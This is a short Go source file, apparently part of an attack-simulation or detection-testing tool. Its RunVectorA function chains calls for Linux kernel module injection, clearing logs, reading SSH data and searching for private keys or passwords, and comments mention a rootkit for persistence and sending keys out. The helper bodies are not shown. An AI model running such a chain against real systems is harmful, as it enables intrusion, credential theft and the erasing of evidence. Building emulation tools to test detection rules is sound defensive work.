package behaviors

import (
	"fmt"
	"time"
)

// Infection mode guarantees that 2 rules are triggered initially

// Download malware (rootkit)? persitence
// busca keys , envia keys

// Borra evidencia Validar que el script deje esta ejecucion en history

func RunVectorA() {
	fmt.Println("Ejecutando la función para vector A")

	// Insmod carga el modulo en la memoria del nucleo del sistema.
	if err := LinuxKernelModuleInjection(); err != nil {
		fmt.Printf("Error: %v\n", err)
	} else {
		fmt.Println("Módulo del kernel inyectado exitosamente.")
	}
	time.Sleep(3 * time.Second)

	// Delete evidence in logs
	err := ClearLogActivities()
	if err != nil {
		fmt.Println("Error:", err)
	} else {
		fmt.Println("El contenido del archivo fue eliminado exitosamente.")
	}

	// Trasladar a la imagen la creacion de la carpeta de llaves para que solo quede la lectura en logs
	ReadSSHInformation()
	time.Sleep(3 * time.Second)

	// Root privileges are required to search for certain files.
	SearchPrivateKeysOrPasswords() // Ajustar tarda bastante tiempo

	// Agregar otra funcion para validar el final termina en Continuando con el flujo del programa

}
